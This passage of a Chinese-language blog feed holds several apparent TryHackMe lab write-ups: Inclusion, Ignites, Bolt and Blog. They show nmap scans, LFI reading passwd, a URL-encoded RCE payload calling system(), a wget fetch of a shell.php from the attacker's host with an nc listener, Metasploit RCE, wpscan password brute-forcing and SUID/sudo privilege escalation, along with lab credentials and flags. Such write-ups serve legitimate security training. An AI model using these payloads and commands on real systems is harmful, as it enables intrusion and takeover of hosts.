alt=""></p><pre><code>65fa0513383ee486f89450160f3aa4c4</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Inclusion</title>
      <link href="/posts/75a2b2e8.html"/>
      <url>/posts/75a2b2e8.html</url>
      
        <content type="html"><![CDATA[<p>分享一道tryhackme的一道非常入门的LFI题</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002193526139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>用nmap扫描开放的端口 <a id="more"></a>)</p><pre><code>nmap -T5 -sV 10.10.158.245 -Pn -sT</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002193639324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>目标机器为linux主机，并且开放了两个端口：22、80。</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>22</td><td>ssh</td></tr><tr><td>80</td><td>http</td></tr></tbody></table><p>22端口爆破无果。访问80端口，按内容提示走发现url文件包含的特性。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002194356955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002194628686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>尝试包含passwd文件，发现了一个用户的用户名和密码–falconfeast:rootpassword</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002194845278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h1><p>利用ssh登录主机</p><pre><code>ssh falconfeast@10.10.158.245</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002195353637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>在falconfeast用户的家目录下找到user.txt：60989655118397345799</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002195503199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="socat提权"><a href="#socat提权" class="headerlink" title="socat提权"></a>socat提权</h1><p>并且该用户可以无密码使用socat命令，了解一波该命令的提全方法</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002195626974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002195916531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>提权成功，拿下root.txt:42964104845495153909</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002200616254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>该靶机还是异常的友好，非常入门。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Ignites</title>
      <link href="/posts/76a2a2e8.html"/>
      <url>/posts/76a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="tryhackme–Ignites"><a href="#tryhackme–Ignites" class="headerlink" title="tryhackme–Ignites"></a>tryhackme–Ignites</h1><p>用nmap扫描</p><pre><code>nmap -T4 -sS -sV 10.10.214.254 -sC</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115210256950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>发现CMS及版本<a id="more"></a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115215900866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>搜索本地漏洞库，发现一个远程代码执行漏洞，不要问我为什么不选sql的，系统命令执行和数据库那个香自己掂量<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111521582953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>查看脚本里面的payload用法<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115220304258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>修改一下paylaod，执行查看源码</p><pre><code>%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"id"%27%29%2b%27'%2bpi(print(%24a%3d'system'))%2b%24a('id')%2b'  #url解码的payload，看的更直观</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115220536603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>接下来就是要弹回一个shell，因为system函数的原因我们执行的命令不能有’,”,;之类的符号，所以我们wget下载的方式下载一个shell，至于这个nc马，kali上有</p><pre><code>python3 -m http.server  #攻击机wget 10.9.xx.xx:8000/shell.php -O shell.php  #服务器执行的命令</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111522342337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111522380986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>马在根目录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115223958205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>设置监听访问nc马，得到一个shell</p><pre><code>nc -lvp 4444</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115224208793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>只有一个root登录用户，并在www-data用户上找到第一个flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115224439790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>接下来进行紧张而又刺激的提权<br>sudo不行，suid不行，没定时任务，Linux内核太高，并且只有root用户，搞完这些，回过头去看网站数据库配置文件，用连接数据库的密码切换root，然后tmd成功了，好家伙，密码复用，亏我还研究了一波：NTFS 3g本地提权漏洞—【CVE-2017-0358】</p><p>上次有个靶机也是密码复用，我发誓拿到shell的第一件事就看数据库配置文件！！！！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115233932771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115234039530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>好吧是我想太多<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115234345672.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><a href="http://mirrors.ren/" target="_blank" rel="noopener">个人博客，欢迎来踩~</a>.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme-Bolt</title>
      <link href="/posts/7ca2a2e8.html"/>
      <url>/posts/7ca2a2e8.html</url>
      
        <content type="html"><![CDATA[<p>注：tryhackme的第二个靶机</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002211606422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>用nmap扫描开放的端口 <a id="more"></a>)</p><pre><code>nmap -T5 -sV 10.10.146.140 -Pn -sT</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002211806346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>目标机器为linux主机，并且开放了两个端口：22、80、8000。</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>22</td><td>ssh</td></tr><tr><td>80</td><td>http</td></tr><tr><td>8000</td><td>http</td></tr></tbody></table><p>#1 What port number has a web server with a CMS running?</p><pre><code>8000</code></pre><p>22端口爆破无果，访问80端口，为apache的默认页面，没有什么可利用的信息。访问8000端口，找到CMS的指纹信息。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002213113816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="bolt漏洞利用"><a href="#bolt漏洞利用" class="headerlink" title="bolt漏洞利用"></a>bolt漏洞利用</h1><p>#2 What is the username we can find in the CMS?</p><pre><code>bolt</code></pre><p>在文章里面找到用户名和密码–bolt：boltadmin123</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002213247943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>#3 What is the password we can find for the username?</p><pre><code>boltadmin123</code></pre><p>谷歌搜索一波该CMS的知名漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002213833146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>#4 What version of the CMS is installed on the server? (Ex: Name 1.1.1)</p><pre><code>Bolt 3.7.1</code></pre><p>按提示在Exploit db寻找该漏洞信息<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002214212765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>#5 There’s an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What’s its EDB-ID?</p><pre><code>48296</code></pre><h1 id="msf拿shell"><a href="#msf拿shell" class="headerlink" title="msf拿shell"></a>msf拿shell</h1><p>在kali打开msf寻找该漏洞的exp，按提示设置好需要的参数</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002214732199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>#6 Metasploit recently added an exploit module for this vulnerability. What’s the full path for this exploit? (Ex: exploit/….)</p><p>Note: If you can’t find the exploit module its most likely because your metasploit isn’t updated. Run <code>apt update</code> then <code>apt install metasploit-framework</code></p><pre><code>exploit/unix/webapp/bolt_authenticated_rce</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201002215123440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>#7  Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit </p><p>因为拿到的shell直接是root权限，故直接用find命令查找。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020100221543810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>#8 Look for flag.txt inside the machine.</p><pre><code>THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}</code></pre><p>这个靶机也是比较入门的没有涉及提权什么的，值得一试。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Blog</title>
      <link href="/posts/75a2a2e8.html"/>
      <url>/posts/75a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="tryhackme–Blog"><a href="#tryhackme–Blog" class="headerlink" title="tryhackme–Blog"></a>tryhackme–Blog</h1><p>nmap扫描</p><pre><code>nmap -T4 -sS -sV 10.10.223.252 -sC </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115171914137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><a id="more"></a><p>CMS和版本都知道了，本地查找漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111517201283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>msf有利用脚本<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115172114197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>查看参数需要账号密码，用wpscan扫描站点用户<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115172333327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>找到两个用户，新建一个用户文件，用于爆破密码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115172526595.png#pic_center" alt=""><br>成功爆出密码：kwheel / cutiepie1</p><pre><code>wpscan --url http://10.10.150.219/ -U user.txt -P tools/dict/rockyou.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115181228565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>回到msf输入用户名密码发现拿不到session，然后把payload换成了正向的shell，成功拿到session，适当换payload这也是一个小技巧<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115182657717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>查找user.txt</p><pre><code>find / -name *user.txt &gt; 2.txtcat 2.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115184434631.png#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115184609888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>tmd是假的<br>sudo -l没有任何收获<br>查看suid权限的文件和命令，找到一个命令，去查了一下没有这个命令，以为不是关键点，后面实在解不出，看了wp，才知道这就是关键点</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115191717392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>执行命令他说我们不是admin，并且为一个64位elf文件，用ltrace查看他引用了哪些函数，看到getenv()函数，就可以知道他与环境变量有关，添加一个环境变量：admin=1，再执行命令权限已经为root，好家伙又学到了一招。</p><pre><code> export admin=1 /usr/sbin/checker</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111519264752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>接下来我们找user.txt的位置和值，找和bjoel用户有关的文件</p><pre><code>find / -user bjoel &gt; 2.txtcat 2.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115194209565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>所以问题的答案：</p><h1 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h1><pre><code>9a0b2b618bef9bfa7ac28c1353d9f318</code></pre><h1 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h1><pre><code>c8421899aae571f7af486492b71a8ab7</code></pre><h1 id="Where-was-user-txt-found"><a href="#Where-was-user-txt-found" class="headerlink" title="Where was user.txt found?"></a>Where was user.txt found?</h1><pre><code>/media/usb</code></pre><h1 id="What-CMS-was-Billy-using"><a href="#What-CMS-was-Billy-using" class="headerlink" title="What CMS was Billy using?"></a>What CMS was Billy using?</h1><pre><code>Wordpress</code></pre><h1 id="What-version-of-the-above-CMS-was-being-used"><a href="#What-version-of-the-above-CMS-was-being-used" class="headerlink" title="What version of the above CMS was being used?"></a>What version of the above CMS was being used?</h1><pre><code>5.0</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115194714167.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><a href="http://mirrors.ren/" target="_blank" rel="noopener">个人博客，欢迎来踩~</a>.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnub-dc-5</title>
      <link href="/posts/71a2a2e8.html"/>
      <url>/posts/71a2a2e8.html</url>
      
